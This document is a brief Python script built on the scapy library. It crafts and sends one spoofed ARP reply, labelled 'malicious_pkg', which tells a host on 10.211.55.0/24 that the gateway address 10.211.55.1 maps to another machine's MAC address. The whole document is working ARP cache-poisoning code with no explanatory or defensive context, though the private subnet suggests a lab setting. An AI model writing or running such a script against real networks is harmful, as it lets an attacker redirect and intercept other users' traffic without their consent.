from scapy.all import *

malicious_pkg = Ether(dst='00:1c:42:89:5d:08') / ARP(
    op = 2, 
    hwsrc = '00:1c:42:cc:30:1e', 
    psrc  = '10.211.55.1', 
    hwdst = '00:1c:42:89:5d:08', 
    pdst  = '10.211.55.5'
)

sendp(malicious_pkg, verbose=False)